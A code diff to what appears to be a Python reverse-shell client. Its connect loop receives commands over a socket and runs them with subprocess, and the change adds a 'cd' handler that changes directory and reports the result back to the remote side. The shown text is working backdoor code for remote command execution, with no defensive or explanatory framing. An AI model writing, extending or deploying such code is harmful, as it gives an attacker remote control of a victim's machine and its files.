@@ -1,4 +1,5 @@
 import socket
+import os
 import subprocess  #  Import necessary libraries
 
 
@@ -12,6 +13,15 @@ def connect():
         if "terminate" in command:  # Terminate session if requested
             mySocket.close()
             break
+        elif "cd " in command:
+            try:
+                code, directory = command.decode().split(" ", 1)
+                os.chdir(directory)
+                informToServer = "Current Working Directory is: " + os.getcwd()
+                mySocket.send(informToServer.encode())
+            except Exception as e:
+                informToServer = "ERRRR: " + str(e)
+                mySocket.send(informToServer.encode())
         else:  # Run rec'd command if not 'terminate'
             cmd = subprocess.Popen(
                 command,
